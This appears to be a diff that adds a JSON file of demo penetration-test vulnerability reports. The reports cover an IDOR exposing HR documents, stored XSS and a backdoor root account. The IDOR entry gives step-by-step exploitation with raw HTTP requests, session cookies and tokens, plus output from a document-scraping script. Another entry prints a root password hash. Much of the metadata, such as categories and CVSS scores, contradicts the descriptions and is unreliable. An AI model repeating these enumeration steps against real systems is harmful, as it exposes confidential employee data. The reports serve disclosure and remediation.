@@ -1,0 +1,4474 @@
+[
+  {
+    "id": "synack-demo-w002-2",
+    "title": "Insufficient Authorization Controls on Employee Document URLs",
+    "tag_list": [
+
+    ],
+    "description": "There is an Insecure Direct Object Reference vulnerability due to a lack of sufficient authentication controls on empl_document URLs. As these URLs are referenced by sequential numeric ID, it is possible to enumerate all URLs across all organizations. As these URLs point to employee documents and, as in and of themselves access to the URLs does not require authentication, this poses a risk to the confidentiality of employee documents and details across all registered companies in the Client’s HR platform.",
+    "impact": "As an HR Admin of a registered organization, it is trivial to enumerate over all sequential Document ID's to gather othersite.com URLs for HR sensitive employee documents across all of the client’s customer organizations. These othersite.com URLs do not require authentication to access.\r\n\r\nThis is estimated to be a very high-risk confidentiality impact.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "Persistent XSS",
+      "parent": "Cross-Site Scripting (XSS)"
+    },
+    "cvss_final": 6.3,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Network (N)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "Required (R)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Unchanged (U)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "Low (L)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:R/S:U/C:N/I:H/A:L",
+    "recommended_fix": "The /api/empl_document/17/ endpoint should check that the user requesting a document URL for a given document ID is authorised to do so.\r\n\r\nIt should also be considered whether storage of sensitive documents at othersite.com with no authentication required (simply a hard-to-guess URL) is appropriate.",
+    "exploitable_locations": [
+      {
+        "type": "ip",
+        "address": "248.252.142.161",
+        "port": 23757,
+        "protocol": "tcp"
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2024-06-12T18:30:17+00:00",
+    "resolved_at": "2023-10-19T12:28:39+00:00",
+    "closed_at": "2024-06-12T18:30:17+00:00",
+    "vulnerability_status": {
+      "id": 185998,
+      "text": "Fixed",
+      "created_at": "2023-10-02T16:18:51.786Z",
+      "flow_position": 4,
+      "flow_type": 2
+    },
+    "listing": {
+      "id": 105853,
+      "codename": "SYNACK-DEMO-W002",
+      "slug": "demoweb002",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb002"
+    },
+    "validation_steps": [
+      {
+        "id": 118810,
+        "number": 1,
+        "detail": "Log in as an organization admin.\nBrowse to https://secure.client.com/employee and choose an employee \"tearsheet\" to upload an example document. This will be used to improperly access a different organization.\nFor this example, use the tearsheet located at https://secure.client.com/employeetearsheet\n",
+        "url": "https://secure.client.com/employee",
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118811,
+        "number": 2,
+        "detail": "Click \"View/Edit Details\" on the employee to reach the tearsheet.",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118812,
+        "number": 3,
+        "detail": "Click Upload.",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118813,
+        "number": 4,
+        "detail": "On the popup dialogue, enter a document name and click \"Upload document\".",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118814,
+        "number": 5,
+        "detail": "On the popup, click \"Choose file\".",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118815,
+        "number": 6,
+        "detail": "From the dialogue, choose a sensitive document to upload (see 01-upload-document.png).",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118816,
+        "number": 7,
+        "detail": "Once the file is uploaded, the popup will close.",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118817,
+        "number": 8,
+        "detail": "Click \"Save\" on the Upload Document dialogue - the Documents section of the employeetearsheet will update to reflect the new document.",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118818,
+        "number": 9,
+        "detail": "Hover over its download link and note that the link points to https://othersite.com/mexkJyoXo7yzHMUKh2TsDXRp - an off-site URL with no authentication capability for file uploads.",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118819,
+        "number": 10,
+        "detail": "During this upload process, a POST was sent from the admin's browser to secure.client.com to create the empl_document object for the URL of this uploaded document.",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118820,
+        "number": 11,
+        "detail": "--- POST /api/empl_document/ HTTP/1.1 Host: secure.client.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Content-Type: application/json; charset=utf-8 X-AJAXToken: 16498f1bd745d7a55a3556d82db315423adb7c5650ad2c5bdf81766b X-Requested-With: XMLHttpRequest Referer: https://secure.client.com/dashboard/ Content-Length: 137 Cookie: csrftoken=zvp2P5slYvO9zxbZGmAw97VNzDWqHE1O; sessionid=sg7vsyimxp72olhx80b83dtqh5g56n2c; ajaxtoken=16498f1bd745d7a55a3556d82db315423adb7c5650ad2c5bdf81766b Connection: keep-alive Pragma: no-cache Cache-Control: no-cache\n{\"name\":\"Very Sensitive Document\",\"url\":\"https://othersite.com/mexkJyoXo7yzHMUKh2TsDXRp\",\"employee_id\":\"116\"}\n",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118821,
+        "number": 12,
+        "detail": "HTTP/1.1 201 CREATED Server: nginx/1.7.1 Date: Fri, 05 Sep 2014 14:08:53 GMT Content-Type: application/json; charset=utf-8 Connection: keep-alive Vary: Cookie Location: https://secure.client.com/api/empl_document Cache-Control: no-cache Set-Cookie: sessionid=sg7vsyimxp72olhx80b83dtqh5g56n2c; expires=Fri, 19-Sep-2014 14:08:49 GMT; httponly; Max-Age=1209600; Path=/; secure Set-Cookie: ajaxtoken=16498f1bd745d7a55a3556d82db315423adb7c5650ad2c5bdf81766b; expires=Fri, 04-Sep-2015 14:08:49 GMT; Max-Age=31449600; Path=/ X-Frame-Options: SAMEORIGIN Content-Length: 199\n{\"carrierTemplateId\": null, \"employee_id\": 116, \"form_type\": null, \"id\": \"17\", \"name\": \"Very Sensitive Document\", \"resource_uri\": 17, \"url\": \"https://othersite.com/mexkJyoXo7yzHMUKh2TsDXRp\"} ---\n",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118822,
+        "number": 13,
+        "detail": "Note that in the response to this request, secure.client.com tells us that the empl_document object was created with the ID of 17.\nKnowing this document link ID, we can log in as an Admin of a different organization to demonstrate the Indirect Object Reference. In our case, we're going to log in as testaccount123@synack.com\n",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118823,
+        "number": 14,
+        "detail": "Snoop on the HTTP traffic for this new login to catch its cookie and ajaxtoken value (see 02-cookie.png).\n--- Cookie: sessionid=c4z7i20bhhtod0c2nyak14mrqd6opyyk; csrftoken=F2Q0hoyp1S7lRDKO0dyaq3OwO1LVclNm; ajaxtoken=3cb5782eaa90e00d182796c2043722114a8e605fb941557a95330811 ---\n",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118824,
+        "number": 15,
+        "detail": "\nNow, drop this cookie, and ajaxtoken as X-AJAXToken, into a GET request for the empl_document with ID of 17\n--- GET /api/empl_document/17/ HTTP/1.1 Host: secure.client.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.0 Accept: application/json, text/javascript, */*; q=0.01 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate X-AJAXToken: 3cb5782eaa90e00d182796c2043722114a8e605fb941557a95330811 X-Requested-With: XMLHttpRequest Referer: https://secure.client.com/dashboard/ Cookie: sessionid=c4z7i20bhhtod0c2nyak14mrqd6opyyk; csrftoken=F2Q0hoyp1S7lRDKO0dyaq3OwO1LVclNm; ajaxtoken=3cb5782eaa90e00d182796c2043722114a8e605fb941557a95330811 Connection: close\nHTTP/1.1 200 OK Server: nginx/1.7.1 Date: Fri, 05 Sep 2014 14:26:20 GMT Content-Type: application/json; charset=utf-8 Connection: close Vary: Accept-Encoding Vary: Accept-Encoding Vary: Cookie Cache-Control: no-cache Set-Cookie: sessionid=c4z7i20bhhtod0c2nyak14mrqd6opyyk; expires=Fri, 19-Sep-2014 14:26:16 GMT; httponly; Max-Age=1209600; Path=/; secure Set-Cookie: ajaxtoken=3cb5782eaa90e00d182796c2043722114a8e605fb941557a95330811; expires=Fri, 04-Sep-2015 14:26:16 GMT; Max-Age=31449600; Path=/ X-Frame-Options: SAMEORIGIN Content-Length: 199\n{\"carrierTemplateId\": null, \"employee_id\": 116, \"form_type\": null, \"id\": \"17\", \"name\": \"Very Sensitive Document\", \"resource_uri\": 17, \"url\": \"https://othersite.com/mexkJyoXo7yzHMUKh2TsDXRp\"} ---\n",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118825,
+        "number": 16,
+        "detail": "\nFrom this request, we can see that the filename for document ID 17 is \"Very Sensitive Document\" and, more importantly, we can see that the URL for the file is https://othersite.com/mexkJyoXo7yzHMUKh2TsDXRp\nBrowsing to this URL, with no authentication required, we see the sensitive document that was uploaded.\n--- GET /api/file/mexkJyoXo7yzHMUKh2TsDXRp HTTP/1.1 Host: othersite.com User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:31.0) Gecko/20100101 Firefox/31.0 Iceweasel/31.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: keep-alive\nHTTP/1.1 200 OK Server: nginx Date: Fri, 05 Sep 2014 14:30:18 GMT Content-Type: text/plain; charset=utf-8 Content-Length: 76 Content-Disposition: inline; filename=\"sensitive.txt\" Cache-Control: public, max-age=3600, no-transform Set-Cookie: session=-; Domain=othersite.com; expires=Thu, 01-Jan-1970 00:00:00 GMT; Path=/ Set-Cookie: session=-; Domain=othersite.com; expires=Thu, 01-Jan-1970 00:00:00 GMT; Path=/ x-amz-id-2: ZZAQNQof9kiJ+5Xv+SIuazQbUNQDrfRzcVqM1v9oMdwe8i4yPZi4oaPhO7TJlN3o x-amz-request-id: E91A1B328A3EEA53 Last-Modified: Fri, 05 Sep 2014 14:07:13 GMT ETag: \"b432a1d59356731281d883759a31ee14\" Accept-Ranges: bytes X-File-Name: sensitive.txt Access-Control-Allow-Headers: CONTENT-TYPE, X-NO-STREAM Access-Control-Allow-Methods: DELETE, GET, HEAD, POST, PUT Access-Control-Allow-Origin: * Access-Control-Max-Age: 21600\nI am a very sensitive document.\n---\n",
+        "url": "https://othersite.com/mexkJyoXo7yzHMUKh2TsDXRp",
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118826,
+        "number": 17,
+        "detail": "\nNow, from this, we can enumerate over all possible document IDs across all of the Client’s customer organizations and fetch the linked-to documents.\nA proof-of-concept scraping script is attached (get-client-documents.sh)\nRunning the script:\n--- % ./get-client-documents.sh Usage: ./get-client-documents.sh <sessionid> <ajaxtoken> [min-id] [max-id] sessionid and ajaxtoken: Log in to https://secure.client.com and get these from your cookie jar min-id and max-id: Document ID's to enumerate from and to. Optional. Default is 1 and 20.\n% ./get-client-documents.sh c4z7i20bhhtod0c2nyak14mrqd6opyyk 3cb5782eaa90e00d182796c2043722114a8e605fb941557a95330811 [+] Testing sessionid and ajaxtoken [+] Looks good! [+] Scraping documents from 1 to 20 [++] Getting url for Doc ID 1 [:(] No URL for this ID\n< -- SNIP see attachment for full log -->\n[++] Getting url for Doc ID 6 [:(] No URL for this ID [++] Getting url for Doc ID 7 [:D] Found a URL downloading it to client-doc-7 --2014-09-06 01:16:58--  https://othersite.com/iwLZqxdaRJ6ev9uKR89X Resolving othersite.com (othersite.com)... 1.2.3.4 Connecting to othersite.com (othersite.com)|othersite.com|:443... connected. HTTP request sent, awaiting response... 200 OK Length: 7 [text/plain] Saving to: ‘client-doc-7’\n100%[============================================================================>] 7           --.-K/s   in 0s\n2014-09-06 01:17:00 (6.79 MB/s) - ‘client-doc-7’ saved [7/7]\n[++] Getting url for Doc ID 8 [:D] Found a URL downloading it to client-doc-8 --2014-09-06 01:17:02--  https://www.google.com/ Resolving www.google.com (www.google.com)... 74.125.237.211, 74.125.237.212, 74.125.237.210, ... Connecting to www.google.com (www.google.com)|74.125.237.211|:443... connected. HTTP request sent, awaiting response... 302 Found Location: https://www.google.com.au/?gfe_rd=cr&ei=7tMJVJb8OMmN8Qf67oGIBw [following] --2014-09-06 01:17:02--  https://www.google.com.au/?gfe_rd=cr&ei=7tMJVJb8OMmN8Qf67oGIBw Resolving www.google.com.au (www.google.com.au)... 74.125.237.216, 74.125.237.207, 74.125.237.215, ... Connecting to www.google.com.au (www.google.com.au)|74.125.237.216|:443... connected. HTTP request sent, awaiting response... 200 OK Length: unspecified [text/html] Saving to: ‘client-doc-8’\n\n    [ <=>                                                                         ] 18,834      --.-K/s   in 0.05s\n\n2014-09-06 01:17:03 (352 KB/s) - ‘client-doc-8’ saved [18834]\n[++] Getting url for Doc ID 9 [:(] No URL for this ID [++] Getting url for Doc ID 10 [:D] Found a URL downloading it to client-doc-10 --2014-09-06 01:17:07--  http://foobar.com%5C/ Resolving foobar.com\\\\ (foobar.com\\\\)... 69.89.31.56 Connecting to foobar.com\\ (foobar.com\\)|69.89.31.56|:80... connected. HTTP request sent, awaiting response... 400 Bad Request 2014-09-06 01:17:07 ERROR 400: Bad Request.\n< -- SNIP see attachment for full log -->\n[+] All done. Drive home safely folks. ---\nChecking out some loot...\n--- % cat client-doc-7 foobar\n% cat client-doc-17 I am a very sensitive document.\n",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      }
+    ],
+    "link": "https://client.synack.com/vulnerabilities/synack-demo-w002-2"
+  },
+  {
+    "id": "SYNACK-DEMO-W001-32",
+    "title": " #14",
+    "tag_list": [
+
+    ],
+    "description": "The application is vulnerable with Persistent Cross Site Scripting vulnerability through name field of 'Grant New Permission' section of the site for given application. Stored (Persistent) XSS issues is where input user is stored (in a file or in a database), then returned to the screen rendered. This vulnerability is more significant than a reflected attack as other users could be affected.",
+    "impact": "By exploiting a Cross-site scripting vulnerability the attacker can hijack a logged-in user’s (may include admins) session.This means that the malicious hacker can maintains access of user's account. In spite of it, an attacker can Redirect user to another website/page/phishing site and can execute browser exploits as well.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "CSRF Protection Missing",
+      "parent": "Cross-site Request Forgery (CSRF)"
+    },
+    "cvss_final": 9.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Adjacent (A)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "None (N)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Unchanged (U)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "None (N)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:A/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:N",
+    "recommended_fix": "Escaping is the primary means to disable an XSS attack. When performing Escaping you are effectively telling the browser that the data you are sending should be treated as data and should not be interpreted in any other way. If an attacker manages to put a script on your page, the victim will not be affected because the browser will not execute the script if it is properly escaped. The one most popular escaping libraries available are the ESAPI provided by OWASP.",
+    "exploitable_locations": [
+      {
+        "type": "url",
+        "value": "https://www.example.com/org/v7saexy",
+        "protocol": null,
+        "address": null,
+        "port": null
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2024-05-30T15:33:59+00:00",
+    "resolved_at": "2023-10-19T12:28:39+00:00",
+    "closed_at": "2024-05-30T15:33:59+00:00",
+    "vulnerability_status": {
+      "id": 185998,
+      "text": "Fixed",
+      "created_at": "2023-10-02T16:18:51.786Z",
+      "flow_position": 4,
+      "flow_type": 2
+    },
+    "listing": {
+      "id": 105849,
+      "codename": "SYNACK-DEMO-W001",
+      "slug": "demoweb001",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb001"
+    },
+    "validation_steps": [
+
+    ],
+    "link": "https://client.synack.com/vulnerabilities/SYNACK-DEMO-W001-32"
+  },
+  {
+    "id": "SYNACK-DEMO-W001-58",
+    "title": " #24",
+    "tag_list": [
+
+    ],
+    "description": "The application is vulnerable with Persistent Cross Site Scripting vulnerability through name field of 'Grant New Permission' section of the site for given application. Stored (Persistent) XSS issues is where input user is stored (in a file or in a database), then returned to the screen rendered. This vulnerability is more significant than a reflected attack as other users could be affected.",
+    "impact": "By exploiting a Cross-site scripting vulnerability the attacker can hijack a logged-in user’s (may include admins) session.This means that the malicious hacker can maintains access of user's account. In spite of it, an attacker can Redirect user to another website/page/phishing site and can execute browser exploits as well.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "SSO Authentication Bypass",
+      "parent": "Authentication/Session Management"
+    },
+    "cvss_final": 10.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Physical (P)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Unchanged (U)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "Low (L)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:P/AC:H/PR:L/UI:N/S:U/C:N/I:H/A:L",
+    "recommended_fix": "Escaping is the primary means to disable an XSS attack. When performing Escaping you are effectively telling the browser that the data you are sending should be treated as data and should not be interpreted in any other way. If an attacker manages to put a script on your page, the victim will not be affected because the browser will not execute the script if it is properly escaped. The one most popular escaping libraries available are the ESAPI provided by OWASP.",
+    "exploitable_locations": [
+      {
+        "type": "url",
+        "value": "https://staging.example.com/settings/bzizage",
+        "protocol": null,
+        "address": null,
+        "port": null
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2024-01-16T21:15:16+00:00",
+    "resolved_at": "2023-10-02T12:30:34+00:00",
+    "closed_at": "2024-01-16T21:15:16+00:00",
+    "vulnerability_status": {
+      "id": 185998,
+      "text": "Fixed",
+      "created_at": "2023-10-02T16:18:51.786Z",
+      "flow_position": 4,
+      "flow_type": 2
+    },
+    "listing": {
+      "id": 105849,
+      "codename": "SYNACK-DEMO-W001",
+      "slug": "demoweb001",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb001"
+    },
+    "validation_steps": [
+
+    ],
+    "link": "https://client.synack.com/vulnerabilities/SYNACK-DEMO-W001-58"
+  },
+  {
+    "id": "synack-demo-w002-1",
+    "title": "Stored XSS in users.scrubbed.com",
+    "tag_list": [
+
+    ],
+    "description": "Some profile settings (email_address, full_name, locale, timezone) of users are accepted without server-side input validation. When one enters malicious scripts in one of the above parameters, they will be executed in the context of 'users.scrubbed.com'.",
+    "impact": "Stored XSS issues could execute in admin or users context. In that case an attacker could execute anything with those elevated rights. Note that DOS would be possible (e.g. delete account), confidentiality breach (I can script access to any account if an admin falls victim).",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "Persistent XSS",
+      "parent": "Cross-Site Scripting (XSS)"
+    },
+    "cvss_final": 7.2,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Local (L)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "High (H)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "Required (R)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Changed (C)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "Low (L)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:R/S:C/C:H/I:H/A:L",
+    "recommended_fix": "Best practice is to never included user-supplied input in Javascript context. Perform strict, server-side input validation on the input at the user profile screen. (<,>,',\",&,(,){,},[,]) characters should never be accepted.\r\n\r\n",
+    "exploitable_locations": [
+      {
+        "type": "app-location",
+        "value": "Temp"
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2024-01-16T15:33:16+00:00",
+    "resolved_at": "2023-10-16T12:28:39+00:00",
+    "closed_at": null,
+    "vulnerability_status": {
+      "id": 185994,
+      "text": "Pending Review",
+      "created_at": "2023-10-02T16:18:51.772Z",
+      "flow_position": 0,
+      "flow_type": 0
+    },
+    "listing": {
+      "id": 105853,
+      "codename": "SYNACK-DEMO-W002",
+      "slug": "demoweb002",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb002"
+    },
+    "validation_steps": [
+      {
+        "id": 118796,
+        "number": 1,
+        "detail": "Sign on to www.scrubbed.com",
+        "url": "http://www.scrubbed.com",
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118797,
+        "number": 2,
+        "detail": "Choose from the menu Account, Settings",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118798,
+        "number": 3,
+        "detail": "Enter the following as fullname: yolo1",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118799,
+        "number": 4,
+        "detail": "Save the profile",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118800,
+        "number": 5,
+        "detail": "Without signing out, request the following URL in antoher browser tab: https://accounts.scrubbed.com/settings.json\r\n(probably a lot more requests might be vulnerable, but I was doing some tests for settngs.json …)",
+        "url": "https://accounts.scrubbed.com/settings.json",
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 118801,
+        "number": 6,
+        "detail": "Twice a popup will be shown (exploit proof of concept) since the full-name is echoed twice in script context:",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      }
+    ],
+    "link": "https://client.synack.com/vulnerabilities/synack-demo-w002-1"
+  },
+  {
+    "id": "synack-demo-d001-2",
+    "title": "Backdoor Root Account 2",
+    "tag_list": [
+
+    ],
+    "description": "A backdoor root account is enabled by default and allows for remote authentication that bypasses the restricted CLI interface. An examination of the SSH server configuration file reveals that root login is allowed over SSH. The \"PermitRootLogin\" directive is not specified and defaults to \"PermitRootLogin yes,” while the root user shell is set to /bin/bash in /etc/passwd. This backdoor root account's presence is not mentioned in any provided user documentation.\n\nIn addition, it was found that this account has a static password that is the same used across multiple OmniPlexer R210 units.",
+    "impact": "If an attacker were able to crack or retrieve the root password for the R210 units, then they would be able to gain full control over all accessible OmniPlexer (and potentially other untested models) units. In addition, this is commonly referred to as a backdoor account and it's existence could easily results in bad PR for BrandX.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "Improper Input Validation (No Injection)",
+      "parent": "Functional/Business Logic"
+    },
+    "cvss_final": 9.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Network (N)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "High (H)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Unchanged (U)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "High (H)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H",
+    "recommended_fix": "1. Evaluate the need for a root account that allows login. If not, then set the root users shell to `/sbin/nologin` in `/etc/passwd`.\n2. Disallow root login over SSH by adding the \"PermitRootLogin no\" directive to the SSH server configuration file.\n3. As with other sensitive certificates and keys on the R210, dynamically generate the root password on initial configuration to ensure the same password is not used across multiple units.",
+    "exploitable_locations": [
+      {
+        "type": "file",
+        "value": "/etc/shadow",
+        "protocol": null,
+        "address": null,
+        "port": null
+      },
+      {
+        "type": "file",
+        "value": "/var/opt/rtm/shadow",
+        "protocol": null,
+        "address": null,
+        "port": null
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-11-07T20:57:57+00:00",
+    "resolved_at": "2023-10-19T12:28:39+00:00",
+    "closed_at": null,
+    "vulnerability_status": {
+      "id": 185995,
+      "text": "In Review",
+      "created_at": "2023-10-02T16:18:51.776Z",
+      "flow_position": 1,
+      "flow_type": 1
+    },
+    "listing": {
+      "id": 105852,
+      "codename": "SYNACK-DEMO-D001",
+      "slug": "demoes00001",
+      "category": "Hardware",
+      "link": "https://client.synack.com/assessments/demoes00001"
+    },
+    "validation_steps": [
+      {
+        "id": 119066,
+        "number": 1,
+        "detail": "Using any valid admin account, authenticate to the OmniPlexer R210 over SSH from two different devices.",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 119067,
+        "number": 2,
+        "detail": "Obtain the `/etc/passwd` and `/etc/shadow` file from these two different units. Both units contain the same root password hash: `root:$3$Sxh5sBs9.$5Sygi27jsS8bg/r3T/c/:4562:5:7432:15::: `",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      },
+      {
+        "id": 119068,
+        "number": 3,
+        "detail": "Output of SSH configuration file also attached",
+        "url": null,
+        "ip_address": null,
+        "port": null,
+        "port_type": null
+      }
+    ],
+    "link": "https://client.synack.com/vulnerabilities/synack-demo-d001-2"
+  },
+  {
+    "id": "SYNACK-DEMO-W001-3",
+    "title": " #1",
+    "tag_list": [
+
+    ],
+    "description": "The application is vulnerable with Persistent Cross Site Scripting vulnerability through name field of 'Grant New Permission' section of the site for given application. Stored (Persistent) XSS issues is where input user is stored (in a file or in a database), then returned to the screen rendered. This vulnerability is more significant than a reflected attack as other users could be affected.",
+    "impact": "By exploiting a Cross-site scripting vulnerability the attacker can hijack a logged-in user’s (may include admins) session.This means that the malicious hacker can maintains access of user's account. In spite of it, an attacker can Redirect user to another website/page/phishing site and can execute browser exploits as well.",
+    "cve_ids": [
+
+    ],
+    "cwe_ids": [
+
+    ],
+    "category": {
+      "display": "Persistent XSS",
+      "parent": "Cross-Site Scripting (XSS)"
+    },
+    "cvss_final": 7.0,
+    "cvss_blob": [
+      {
+        "question": "Attack Vector (AV)",
+        "response": "Network (N)"
+      },
+      {
+        "question": "Attack Complexity (AC)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Privileges Required (PR)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "User Interaction (UI)",
+        "response": "None (N)"
+      },
+      {
+        "question": "Scope (S)",
+        "response": "Unchanged (U)"
+      },
+      {
+        "question": "Confidentiality (C)",
+        "response": "High (H)"
+      },
+      {
+        "question": "Integrity (I)",
+        "response": "Low (L)"
+      },
+      {
+        "question": "Availability (A)",
+        "response": "None (N)"
+      }
+    ],
+    "cvss_version": "3.1",
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N",
+    "recommended_fix": "Escaping is the primary means to disable an XSS attack. When performing Escaping you are effectively telling the browser that the data you are sending should be treated as data and should not be interpreted in any other way. If an attacker manages to put a script on your page, the victim will not be affected because the browser will not execute the script if it is properly escaped. The one most popular escaping libraries available are the ESAPI provided by OWASP.",
+    "exploitable_locations": [
+      {
+        "type": "url",
+        "value": "https://example.com/api2/eljeacf",
+        "protocol": null,
+        "address": null,
+        "port": null
+      }
+    ],
+    "http_requests": [
+
+    ],
+    "updated_at": "2023-11-07T20:55:59+00:00",
+    "resolved_at": "2023-09-24T12:30:34+00:00",
+    "closed_at": null,
+    "vulnerability_status": {
+      "id": 185995,
+      "text": "In Review",
+      "created_at": "2023-10-02T16:18:51.776Z",
+      "flow_position": 1,
+      "flow_type": 1
+    },
+    "listing": {
+      "id": 105849,
+      "codename": "SYNACK-DEMO-W001",
+      "slug": "demoweb001",
+      "category": "Web Application",
+      "link": "https://client.synack.com/assessments/demoweb001"
+    },
+    "validation_steps": [
+
+    ],
